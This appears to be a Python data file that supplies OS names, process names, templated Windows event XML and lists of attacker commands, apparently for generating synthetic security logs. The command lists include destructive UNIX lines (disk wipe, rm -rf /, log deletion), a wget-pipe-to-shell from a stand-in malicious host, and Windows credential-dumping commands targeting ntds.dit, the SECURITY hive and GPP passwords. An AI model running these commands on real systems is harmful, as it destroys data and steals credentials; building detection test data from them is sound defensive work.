OS_LIST = [
    "AIX 7.2",
    "HP-UX 11i v3",
    "Solaris 11",
    "FreeBSD 13.2",
    "OpenBSD 7.4",
    "NetBSD 10.0",
    "Ubuntu 22.04 LTS",
    "Red Hat Enterprise Linux 9",
    "CentOS 8",
    "Debian 12",
    "Fedora 38",
    "Arch Linux 2024.09",
    "Kali Linux 2024.1",
    "Alpine Linux 3.18",
    "SUSE Linux Enterprise Server 15 SP4",
    "Windows 10 Pro",
    "Windows 11 Home",
    "Windows Server 2019",
    "Windows Server 2022",
    "Windows 8.1",
    "Windows 7 SP1",
    "macOS Ventura 13",
    "macOS Monterey 12",
    "macOS Big Sur 11",
    "macOS Catalina 10.15",
    "macOS Mojave 10.14",
    "iOS 17",
    "iPadOS 17",
    "Android 14",
    "HarmonyOS 3.1"
]
UNIX_CMD = [
    "cat /etc/shadow",
    "dd if=/dev/zero of=/dev/sda",
    "rm -rf /",
    "find / -name '*.log' -exec rm -f {} \\;",
    "wget -O- http://malicious.example.com/malware | sh",
    "iptables -F",
    "chmod -R 777 /",
    "chown -R nobody:nogroup /"
]
UNIX_CMD = [
    "cat /etc/shadow",
    "dd if=/dev/zero of=/dev/sda",
    "rm -rf /",
    "find / -name '*.log' -exec rm -f {} \\;",
    "wget -O- http://malicious.example.com/malware | sh",
    "iptables -F",
    "chmod -R 777 /",
    "chown -R nobody:nogroup /"
]
WINDOWS_CMD = [
    "net localgroup", "net user", "Get-LocalUser", "Get-LocalGroup",
    "rundll32.exe vaultcli.dll,VaultEnumerateVaults 0,%TEMP%\\vaultList.txt",
    "Import-Module DSInternals; Get-CachedDomainCredential",
    "Import-Module DSInternals; Get-SamDomainInformation",
    "Import-Module PowerSploit; Invoke-NinjaCopy -Path 'C:\\Windows\\NTDS\\ntds.dit' "
    "-Destination 'C:\\temp\\ntds.dit'",
    "Import-Module PowerShellVault; Get-VaultCredential",
    "reg.exe save HKLM\\Security %TEMP%\\security.hive",
    "Import-Module DSInternals; Get-WinSystemKey",
    "wmic.exe /namespace:\\root\\cimv2 path Win32_Account",
    "Import-Module PowerSploit; Get-GPPPassword"
]
WIN_PROCESSES = ["explorer.exe", "svchost.exe", "services.exe", "lsass.exe", "smss.exe", "csrss.exe", "wininit.exe",
                 "winlogon.exe", "taskhostw.exe", "conhost.exe", "dwm.exe", "wuauclt.exe", "SearchIndexer.exe",
                 "spoolsv.exe", "taskmgr.exe", "regedit.exe", "mmc.exe", "rundll32.exe", "dllhost.exe"]
WIN_EVENTS = [
    '<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">'
    '<System><Provider Name="Microsoft-Windows-Sysmon" Guid="{guid}"/>'
    '<EventID>10</EventID><Version>5</Version><Level>4</Level><Task>10</Task><Opcode>0</Opcode>'
    '<Keywords>0x8000000000000000</Keywords><TimeCreated SystemTime="{system_time}"/>'
    '<EventRecordID>{event_record_id}</EventRecordID><Correlation/>'
    '<Execution ProcessID="{process_id}" '
    'ThreadID="{thread_id}" Channel="Microsoft-Windows-Sysmon/Operational"/>'
    '<EventData><Data Name="TargetImage">C:\\Windows\\System32\\calc.exe</Data>'
    '<Data Name="TargetPID">{target_pid}</Data></EventData></Event>',
    '<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">'
    '<System><Provider Name="Microsoft-Windows-Security-Auditing" Guid="{guid}"/>'
    '<EventID>4672</EventID><Version>0</Version><Level>0</Level><Task>12544</Task><Opcode>0</Opcode>'
    '<Keywords>0x8020000000000000</Keywords><TimeCreated SystemTime="{system_time}"/>'
    '<EventRecordID>{event_record_id}</EventRecordID><Correlation/>'
    '<Execution ProcessID="{process_id}" '
    'ThreadID="{thread_id}" Channel="Security"/><Computer>{host}</Computer>'
    '<Security UserID="{user_id}"/>'
    '<EventData><Data Name="SubjectUserSid">{user_id}</Data>'
    '<Data Name="SubjectUserName">{user_name}</Data>'
    '<Data Name="SubjectDomainName">{domain_name}</Data>'
    '<Data Name="SubjectLogonId">{subject_login_id}</Data>'
    '<Data Name="PrivilegeList">{privilege_list}</Data></EventData></Event>',
    '<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">'
    '<System><Provider Name="Microsoft-Windows-Security-Auditing" Guid="{guid}"/>'
    '<EventID>4648</EventID><Version>0</Version><Level>0</Level><Task>13824</Task><Opcode>0</Opcode>'
    '<Keywords>0x8020000000000000</Keywords><TimeCreated SystemTime="{system_time}"/>'
    '<EventRecordID>{event_record_id}</EventRecordID><Correlation/><Execution ProcessID="'
    '{process_id}" '
    'ThreadID="{thread_id}" Channel="Security"/><Computer>{host}</Computer>'
    '<Security UserID="{user_id}"/>'
    '<EventData><Data Name="SubjectUserSid">{user_id}</Data><Data Name="SubjectUserName">'
    '{user_name}</Data>'
    '<Data Name="SubjectDomainName">{domain_name}</Data><Data Name="SubjectLogonId">'
    '{user_id}</Data>'
    '<Data Name="NewProcessId">{new_process_id}</Data><Data Name="ProcessId">{process_id}</Data>'
    '<Data Name="CommandLine">{cmd}</Data><Data Name="TargetUserSid">{user_id}</Data>'
    '<Data Name="TargetUserName">{user_name}</Data><Data Name="TargetDomainName">'
    '{domain_name}</Data>'
    '<Data Name="TargetLogonId">{user_id}</Data><Data Name="LogonType">3</Data></EventData></Event>',
    '<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">'
    '<System><Provider Name="Microsoft-Windows-Security-Auditing" Guid="{guid}"/>'
    '<EventID>4624</EventID><Version>0</Version><Level>0</Level><Task>12544</Task><Opcode>0</Opcode>'
    '<Keywords>0x8020000000000000</Keywords><TimeCreated SystemTime="{system_time}"/>'
    '<EventRecordID>{event_record_id}</EventRecordID><Correlation/>'
    '<Execution ProcessID="{process_id}" '
    'ThreadID="{thread_id}" Channel="Security"/><Computer>{host}</Computer>'
    '<Security UserID="{user_id}"/><EventData><Data Name="SubjectUserSid">{user_id}</Data>'
    '<Data Name="SubjectUserName">{user_name}</Data>'
    '<Data Name="SubjectDomainName">{domain_name}</Data><Data Name="SubjectLogonId">{user_id}</Data>'
    '<Data Name="LogonType">3</Data><Data Name="TargetUserSid">{user_id}</Data>'
    '<Data Name="TargetUserName">{user_name}</Data>'
    '<Data Name="TargetDomainName">{domain_name}</Data>'
    '<Data Name="ProcessName">{process_name}</Data><Data Name="ProcessId">{process_id}</Data>'
    '<Data Name="DestinationLogonId">{destination_login_id}</Data>'
    '<Data Name="SourceNetworkAddress">{source_network_address}</Data>'
    '<Data Name="SourcePort">{local_port}</Data><Data Name="LogonGuid">{guid}</Data>'
    '<Data Name="TransmittedServices">{transmitted_services}</Data></EventData></Event>',
    '<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">'
    '<System><Provider Name="Microsoft-Windows-Security-Auditing" Guid="{guid}"/>'
    '<EventID>4688</EventID><Version>0</Version><Level>0</Level><Task>13312</Task><Opcode>0</Opcode>'
    '<Keywords>0x8020000000000000</Keywords><TimeCreated SystemTime="{system_time}"/>'
    '<EventRecordID>{event_record_id}</EventRecordID><Correlation/>'
    '<Execution ProcessID="{process_id}" '
    'ThreadID="{thread_id}" Channel="Security"/><Computer>{host}</Computer>'
    '<Security UserID="{user_id}"/>'
    '<EventData><Data Name="SubjectUserSid">{user_id}</Data>'
    '<Data Name="SubjectUserName">{user_name}</Data>'
    '<Data Name="SubjectDomainName">{domain_name}</Data><Data Name="SubjectLogonId">{user_id}</Data>'
    '<Data Name="NewProcessId">{new_process_id}</Data>'
    '<Data Name="CreatorProcessId">{process_id}</Data>'
    '<Data Name="TokenElevationType">TokenElevationTypeLimited (3)</Data>'
    '<Data Name="ProcessCommandLine">{cmd}</Data>'
]
